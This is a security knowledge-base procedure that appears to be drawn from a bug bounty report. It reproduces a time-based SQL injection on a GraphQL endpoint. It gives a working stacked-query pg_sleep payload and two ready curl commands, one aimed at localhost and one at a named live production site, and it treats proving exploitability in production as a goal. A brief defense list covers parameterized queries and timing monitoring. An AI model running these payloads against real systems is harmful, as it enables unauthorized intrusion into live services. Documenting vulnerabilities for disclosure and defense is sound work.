---
tags:
  - sql-injection
  - reproduction
type: procedure
tools:
  - '[[tools/Curl-for-HTTP-Requests]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-local-sql-injection-reproduce]]'
  - '[[commands/curl-prod-sql-injection-reproduce]]'
verified: false
platforms:
  - Web
  - PostgreSQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:09.950Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: fe6a1bfb-793f-40b7-a971-0ef36fb81ba1
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Reproduce-SQL-Injection-with-Malicious-Payload

## Summary

This procedure reproduces the SQL injection by sending a crafted payload to the /graphql endpoint, confirming execution through response delays.

## Description

The payload '1';SELECT 1;SELECT pg_sleep(30);--' closes the string, injects benign SELECTs, and causes a delay to prove execution in the PostgreSQL secure schema context.

## Requirements

1. Access to local (port 8080) and production (https://hackerone.com) environments
2. curl tool installed
3. Network connectivity to the endpoint

## Defense

Defensive measures and detection strategies:

- Parameterize all database queries
- Validate and sanitize GraphQL inputs
- Monitor for unusual response times or pg_sleep usage

## Objectives

1. Confirm injection point functionality
2. Demonstrate arbitrary SQL execution
3. Validate exploitability in production

## Instructions

### Step 1: Local Reproduction

**Context**: Test the payload locally to avoid production impact.

**Command** ([[commands/curl-local-sql-injection-reproduce]]):
```bash
curl -X POST http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

> This sends a POST request with the URL-encoded payload, expecting a 30-second delay.

### Step 2: Production Reproduction

**Context**: Verify on the live site with the same payload.

**Command** ([[commands/curl-prod-sql-injection-reproduce]]):
```bash
curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

> Observe the delay to confirm execution without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-local-sql-injection-reproduce]]
- [[commands/curl-prod-sql-injection-reproduce]]

## Tools Used

- [[tools/Curl-for-HTTP-Requests]]

## Tags

- sql-injection
- reproduction
